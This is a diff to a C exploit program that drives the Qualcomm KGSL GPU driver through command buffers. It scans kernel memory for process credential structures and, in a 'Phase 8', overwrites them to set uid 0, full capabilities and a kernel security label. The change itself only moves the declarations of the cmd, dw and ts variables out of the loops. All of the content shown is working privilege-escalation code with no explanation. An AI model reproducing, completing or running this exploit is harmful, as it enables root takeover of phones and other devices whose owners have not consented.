@@ -466,12 +466,16 @@ int main(int argc, char **argv) {
     int n_cred = 0;
     int sec_offset = -1;
 
+    uint32_t *cmd;
+    int dw;
+    unsigned int ts;
+
     for (uint64_t va = scan_start; va < end_va && n_cred < 1; va += 0x1000) {
         if (((va - scan_start) & 0xFFFFF) == 0) printf(".");
         memset(ib_m, 0, 0x10000);
         memset(dst_m, 0, 0x1000);
-        uint32_t *cmd = (uint32_t *)ib_m;
-        int dw = 0;
+        cmd = (uint32_t *)ib_m;
+        dw = 0;
         cmd[dw++] = cp_type7(CP_NOP, 0);
         for (int i = 0; i < SCAN_DWORDS; i++) {
             uint32_t dl, dh, sl, sh;
@@ -484,7 +488,6 @@ int main(int argc, char **argv) {
         }
         cmd[dw++] = cp_type7(CP_NOP, 0);
         __sync_synchronize();
-        unsigned int ts;
         if (submit_ib(kgsl_fd, ctx_id, ib_ga, dw*4, ib_id, &ts) < 0) break;
         if (wait_timestamp(kgsl_fd, ctx_id, ts) < 0) break;
         __sync_synchronize();
@@ -530,8 +533,8 @@ int main(int argc, char **argv) {
     printf("[*] Phase 8: Overwrite cred fields (uid=0, caps=full, security=kernel SID)\n");
     for (int p = 0; p < n_cred && p < 32; p++) {
         uint64_t cbase = cred_pages[p] + cred_offs[p];
-        uint32_t *cmd = (uint32_t *)ib_m;
-        int dw = 0;
+        cmd = (uint32_t *)ib_m;
+        dw = 0;
         memset(ib_m, 0, 0x10000);
         cmd[dw++] = cp_type7(CP_NOP, 0);
 
@@ -566,7 +569,6 @@ int main(int argc, char **argv) {
 
         cmd[dw++] = cp_type7(CP_NOP, 0);
         __sync_synchronize();
-        unsigned int ts;
         if (submit_ib(kgsl_fd, ctx_id, ib_ga, dw*4, ib_id, &ts) == 0)
             wait_timestamp(kgsl_fd, ctx_id, ts);
     }
